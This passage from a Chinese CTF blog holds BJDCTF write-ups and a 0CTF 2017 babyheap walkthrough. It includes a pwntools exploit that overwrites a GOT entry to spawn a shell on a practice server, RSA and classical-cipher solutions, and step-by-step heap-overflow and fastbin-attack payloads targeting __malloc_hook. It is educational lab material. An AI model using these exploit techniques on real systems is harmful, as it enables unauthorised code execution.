0x4010b6 (atoi@plt+6) ◂— push   8</span><br><span class="line">[0x46d060] sprintf@GLIBC_2.2.5 -&gt; 0x4010c6 (sprintf@plt+6) ◂— push   9 /* <span class="string">'h\t'</span> */</span><br><span class="line">[0x46d068] <span class="built_in">exit</span>@GLIBC_2.2.5 -&gt; 0x4010d6 (<span class="built_in">exit</span>@plt+6) ◂— push   0xa /* <span class="string">'h\n'</span> */</span><br></pre></td></tr></table></figure><p>可以看到<code>printf@plt + 6 = 0x401086</code> , <code>system@plt + 6 = 0x401076</code>只相差0x10。</p><p>加之每猜对一次，times -= 1，我们可以通过溢出覆盖<code>times_ptr</code>为<code>0x46d040</code>，然后答对一定的次数，让printf_got变为system_plt，然后故意答错，触发<code>printf(name)</code>即触发<code>system(&#39;/bin/sh&#39;)</code></p><p><strong>这里有一点需要注意</strong>：官方WP给的是答对0x10次，让printf_got变成0x401076也就是<code>system@plt + 6</code>，但是亲测打不通，调试以后发现其他一切正常，但是调用system的时候报段错误…这里我试了一下，答对0x14或者0x15次，也就是让printf_got变成<code>system@plt+2</code>或者<code>system@plt+1</code>才可。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ASDGASDFFEWAVXZC.jpg" alt></p><p>附上EXP:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#c = process('./secret')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29217</span>)</span><br><span class="line">elf = ELF(<span class="string">'./secret'</span>)</span><br><span class="line">L = [<span class="number">0x476B</span>,<span class="number">0x2D38</span>,<span class="number">0x4540</span>,<span class="number">0x3E77</span>,<span class="number">0x3162</span>,<span class="number">0x3f7d</span>,<span class="number">0x357a</span>,<span class="number">0x3cf5</span>,</span><br><span class="line">     <span class="number">0x2f9e</span>,<span class="number">0x41ea</span>,<span class="number">0x48d8</span>,<span class="number">0x2763</span>,<span class="number">0x474c</span>,<span class="number">0x3809</span>,<span class="number">0x2e63</span>,<span class="number">0x2f4a</span>,</span><br><span class="line">     <span class="number">0x3298</span>,<span class="number">0x28f3</span>,<span class="number">0x3d1b</span>,<span class="number">0x449e</span>,<span class="number">0x3328</span>]</span><br><span class="line">success(hex(elf.got[<span class="string">'printf'</span>]))</span><br><span class="line">c.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh;AAAAAAAA'</span>+p32(elf.got[<span class="string">'printf'</span>]))<span class="comment">#use p32()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    c.recvuntil(<span class="string">'Secret:'</span>)</span><br><span class="line">    c.sendline(str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c, 'b * 0x40133a')</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Secret:'</span>)</span><br><span class="line">c.sendline(<span class="string">'66666'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h2><p>base64,decode一下就好了。</p><h2 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h2><p>脑洞够大。</p><p><code>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</code></p><p>这句话的谐音就是<code>BJD大括号这就是福莱格(flag)直接交了吧大括号</code></p><p>所以flag为<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p><h2 id="燕言燕语-y1ng"><a href="#燕言燕语-y1ng" class="headerlink" title="燕言燕语-y1ng"></a>燕言燕语-y1ng</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:</span><br><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br></pre></td></tr></table></figure><p>给了一串HEX，转ASCII以后是<code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code></p><p>猜测是<code>维吉尼亚密码</code>，密钥是<code>yanzi</code>，成功解密</p><p>flag为<code>BJD{yanzi_jiushige_shabi}</code></p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h2><p>小猫很可爱。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322234152.png" alt></p><p>从上往下，每一行代表一个二进制数，吃饭团的表示0，吃鸡腿的表示1</p><p>bin转ascii得到flag。</p><p><code>BJD{M!a0~}</code></p><h2 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h2><p>这题有点水，赛后看WP才知道这个密码是圣堂武士密码，通过查题目的题干能知道这是星际争霸里面的一个角色的一个技能台词？？！！</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323224751.png" alt></p><h2 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h2><p>给了一个txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.</span><br><span class="line">Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&apos;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&apos;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &apos;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&apos; Pzffw ozqh,&apos;os tsn wse azt czw usf lw hqttkf!&apos; Tsn q nqbb vqjk wse npzd wse nztd.</span><br><span class="line">MIH&#123;cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw&#125;</span><br></pre></td></tr></table></figure><p>下面有类似于flag的东西，但开头不是<code>BJD</code>而是<code>MIH</code>，盲猜维吉尼亚密码。</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a>在线解密,指定<code>MIH=BJD</code>,可以得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&apos;t a Japanese name but he is really a Japanese. Harry woryed in a lawyer&apos;s office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. &apos;I have never borrrowed any money from you,&apos; Harry said,&apos;so now you can pay for my dinner!&apos; Now i will give you what you want. BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure><p>但是提交一直不成功，修改<code>Cr4cy</code>为<code>Cr4zy</code>也不成功，去群里看了看公告，发现有地方需要改。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323005432.png" alt></p><p>读了读上面那段话，发现那段话里面该是k的地方全变成了y，所以修改<code>Cr4cy</code>为<code>Cr4ck</code>。</p><p><code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h2 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h2><p>nc连接以后有如下回显，<strong>好像因为靶机不同，具体的回显也不同</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">e=<span class="number">15549851</span></span><br><span class="line"></span><br><span class="line">p+q=<span class="number">20863578032664632805803247009000344892321432818463015557495155759957380706376484569788486497652311136327651058215395343509008398250545579129166602948550344</span></span><br><span class="line"></span><br><span class="line">p-q=<span class="number">-3836010044914889517982485973339196492824587499988100701447424038126206797371420912301320412708697078766834687669285168738335604543547774164235502781085390</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959</span></span><br><span class="line"></span><br><span class="line">flag=??????</span><br></pre></td></tr></table></figure><p>….直接解出来p和q 然后…直接做就行…</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =gmpy2.mpz(<span class="number">8513783993874871643910380517830574199748422659237457428023865860915586954502531828743583042471807028780408185273055087385336396853498902482465550083732477</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">12349794038789761161892866491169770692573010159225558129471289899041793751873952741044903455180504107547242872942340256123672001397046676646701052864817867</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">15549851</span>)</span><br><span class="line"></span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line">c=gmpy2.mpz(<span class="number">4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959</span>)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:].replace(<span class="string">'L'</span>,<span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h2><p><strong>同样是靶机不同，回显不同</strong></p><p>和rsa0一样，不过这个要根据完全平方公式推出来p和q、尝试过得出来pq（也就是n）以后直接分解n，但是分解难度太大，所以还是根据完全平方公式推p和q吧。</p><p>有一处是需要对<code>(p+q)^2</code>进行开放，普通的<code>math.sqrt()</code>方法因为这个数太大了而会报错，这里需要用<code>gmpy2.iroot(gg,2),gg代表(p+q)^2</code>，很幸运，正好开平方，<strong>也就是得到的结果进行平方以后正好等于(p+q)^2</strong></p><p>得到pqec以后脚本和rsa0就一样了。</p><hr>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>0CTF 2017 babyheap</title>
    <url>/2020/03/02/0CTF-2017-babyheap/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/67646151_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间在CTF-WIKI上面学习Fastbin Attack的时候遇到过这道题目，因为这道题目涉及了一些当时还未学到的知识，就略过了这道题目。今天在BUUCTF上又刷到了这道题目，知识储备也够做这道题目了。但依然遇到了一些小困难，这道题目细节还是挺多的。</p><p>题目可以去BUUCTF上面下载，也可以从CTF-WIKI上面的下载链接来下载<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap" target="_blank" rel="noopener">下载链接</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>题目的保护全开</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Allocate</span><br><span class="line"><span class="number">2.</span> Fill</span><br><span class="line"><span class="number">3.</span> Free</span><br><span class="line"><span class="number">4.</span> Dump</span><br><span class="line"><span class="number">5.</span> Exit</span><br></pre></td></tr></table></figure><p>题目共有5个功能</p><h2 id="1-Allocate"><a href="#1-Allocate" class="headerlink" title="1. Allocate"></a>1. Allocate</h2><p>该函数采用calloc的方式申请堆块，且申请size要小于等于4096。</p><blockquote><p>malloc申请后空间的值是随机的，并没有进行初始化，而calloc却在申请后，对空间逐一进行初始化，并设置值为0。</p></blockquote><p>该程序最多申请16个堆块，每次申请堆块时，会在一个地址( 这个地址每次运行都不一样，这个地址的生成算法在sub_B70函数 )附近存放该堆块的信息(是否申请，size，content指针)。</p><p>格式如下:</p><table><thead><tr><th>是否已申请? 1 : 0</th></tr></thead><tbody><tr><td>size</td></tr><tr><td>content指针</td></tr></tbody></table><h2 id="2-Fill"><a href="#2-Fill" class="headerlink" title="2. Fill"></a>2. Fill</h2><p><strong>该函数能实现无限写功能，存在堆溢出。</strong></p><p>在这个函数里面，程序要求我们输入一个size，这个size不同于我们<code>1. Allocate</code>里面要求输入的size。这是两个完全独立的变量，只不过名字都叫size。</p><h2 id="3-Free"><a href="#3-Free" class="headerlink" title="3. Free"></a>3. Free</h2><p>该函数能够进行释放堆块，free掉content指针，并且置为NULL</p><h2 id="4-Dump"><a href="#4-Dump" class="headerlink" title="4. Dump"></a>4. Dump</h2><p>该函数会根据<code>1. Allocate</code>里的size的大小来输出content指针所指向的内容，size多大就输出多少个字节的内容。</p><h2 id="5-Exit"><a href="#5-Exit" class="headerlink" title="5. Exit"></a>5. Exit</h2><p>退出程序</p><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><p>由于用来存放chunk信息的那块地址每次都不一样，不太好通过修改content指针进而修改其内容来偷梁换柱，而且程序是<code>Full RELRO</code>，也没办法通过覆盖got表来getshell。</p><p>不过可以用<code>__malloc_hook</code>或者<code>__free_hook</code>。</p><p>本文采用<code>__malloc_hook</code>，如果用<code>__free_hook</code>原理一样。</p><p>其原理是:</p><blockquote><p><strong>malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数,可以通过写 malloc_hook 让其指针不为空来执行我们所设置的函数来 getshell</strong></p></blockquote><ul><li><p>首先，我们需要泄露libc地址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，这里借助smallbin的fd和bk指向main_arena来泄露libc基地址。</p></li><li><p>然后利用fastbin attack 将chunk分配到<code>__malloc_hook</code>附近，从而修改<code>__malloc_hook</code></p></li></ul><h1 id="0x02-Let’s-do-it-！"><a href="#0x02-Let’s-do-it-！" class="headerlink" title="0x02 Let’s do it ！"></a>0x02 Let’s do it ！</h1><h2 id="前期模板"><a href="#前期模板" class="headerlink" title="前期模板"></a>前期模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',29105)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line">    c.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    c.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br></pre></td></tr></table></figure><h2 id="Leak-libc"><a href="#Leak-libc" class="headerlink" title="Leak libc"></a>Leak libc</h2><blockquote><p>当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力</p></blockquote><p>那么我们可以这样设置堆块。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x50</span>)<span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>堆块0大小没有严格要求，但别太离谱，这个堆块是用来修改chunk1的header的。</p><p>堆块1大小似乎必须是0x40，这是有目的的，后续会讲到。</p><p>堆块2需要是samllbin，这是为了通过unsorted bin泄露libc。</p><p>堆块3是为了不让堆块2和top chunk紧邻而申请的，大小和堆块0一样，没有严格要求，但别太离谱。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">申请完以后布局如下</span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557570a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557570b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x5555557570c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557570d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557570e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557570f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555757150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ea1</span></span><br><span class="line"><span class="number">0x555555757170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后我们需要通过修改chunk1的size来实现chunk1的扩张，具体就是先修改size，然后free，然后再申请，因为这是fastbin，申请后还在这。<strong>需要扩张是因为dump函数是根据chunk的size来决定输出多少内容的。</strong></p><p>扩张多少？ 扩张到能够输出chunk2的fd和bk就行，也就是扩张0x20。那么chunk1的size需要改成0x71。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br></pre></td></tr></table></figure><p>借助fill函数里的无限写，很容易能实现扩张。</p><p>但是这里需要注意的是: 由于程序采用的calloc函数进行申请，会初始化所申请的堆块，也就是说，如果我们free(1)，然后再申请回来1，因为已经扩张了，chunk2的header和data区的前0x10个字节都会被初始化为0。</p><h3 id="一个细节-疑惑"><a href="#一个细节-疑惑" class="headerlink" title="一个细节(疑惑)"></a>一个细节(疑惑)</h3><p>这里还有一个细节：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br></pre></td></tr></table></figure><p>这里还需要修改一下chunk2的内容，这样做有点伪造chunk的意思，后面这个p64(0x71)就在chunksize的位置。</p><p>这一步确实是需要有的，如果没有的话exp就会崩。</p><p>查阅了一些博客，大部分博主都说这一步的目的是<code>Corrupting smallbin-&gt;size to pass allocation assert</code>，也就是绕过alloc的验证，不然过会free(1),alloc(0x60)会失败。</p><p>但是如果不加上这个p64(0x71)，就连free(1)都会导致程序崩溃，这似乎和unlink有关？</p><blockquote><p>0x71 被称为chunksize ,下面这段代码是malloc.c中的一段代码，如果fastbin_index (chunksize (victim)) != idx， 就会corruption, free的时候也会检查chunksize, 根据chunksize的大小，free相应的空间.</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>比较奇怪的是: p64(11) ,p64(61),p64(62),p64(111),p64(1111)还有一堆我试了试都可以，似乎只要大于等于11且不是太大都可以， 应该没必要非得是p64(71)吧？</strong></p><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>然后利用fastbin的特性，free然后alloc 实现堆块重叠</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>然后给smallbin 恢复它的header</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">1</span>,len(payload),payload)</span><br></pre></td></tr></table></figure><p>然后free掉smallbin，这样它的fd和bk都会指向main_arena的一块地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>来看一下效果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span>&lt;--chunk1   -</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>            |</span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>            |</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>            |这些都是chunk1</span><br><span class="line"><span class="number">0x5555557570a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>            |</span><br><span class="line"><span class="number">0x5555557570b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span>&lt;--chunk2   |</span><br><span class="line"><span class="number">0x5555557570c0</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span>&lt;--fd bk    —</span><br><span class="line"><span class="number">0x5555557570d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span></span><br><span class="line"><span class="number">0x5555557570e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557570f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757140</span>:	<span class="number">0x0000000000000090</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x555555757150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ea1</span></span><br><span class="line"><span class="number">0x555555757170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>来看一下smallbin的fd和bk指向的是哪？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;:	<span class="number">0x0000555555757160</span></span><br></pre></td></tr></table></figure><p>可以看到 它们指向了main_arena + 88</p><p><img 